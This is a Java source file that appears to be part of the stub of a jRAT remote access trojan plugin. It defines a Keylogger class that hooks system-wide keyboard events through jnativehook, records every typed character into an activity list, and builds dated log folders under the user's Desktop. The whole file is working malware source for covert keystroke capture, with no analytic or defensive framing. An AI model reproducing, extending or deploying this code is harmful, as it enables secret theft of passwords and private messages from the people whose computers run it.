package pro.jrat.plugin.stub;

import java.io.File;
import java.util.Date;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import pro.jrat.plugin.stub.activities.Activities;
import pro.jrat.plugin.stub.activities.Key;

@SuppressWarnings("deprecation")
public class Keylogger implements NativeKeyListener {

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {		
		try {					
		    Activities.add(new Key(arg0.getKeyChar()));
		} catch (Exception e) {
			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
		}

	}

	public static File getLogsRoot() {
		File file = new File(System.getProperty("user.home") + "\\Desktop\\LOGSTEST\\");
		file.mkdirs();
		return file;
	}

	public static File getTodaysFile() {		
		Date date = new Date();
		
		File day = new File(getMonthFolder(), (date.getDate()) + ".log");
		
		return day;
	}
	
	public static File getMonthFolder() {
		Date date = new Date();

		File month = new File(getYearFolder(), (date.getMonth() + 1) + "");
		month.mkdirs();
			
		return month;
	}

	public static File getYearFolder() {
		Date date = new Date();

		File year = new File(Keylogger.getLogsRoot(), (date.getYear() + 1900) + "");
		year.mkdirs();
		
		return year;
	}
}
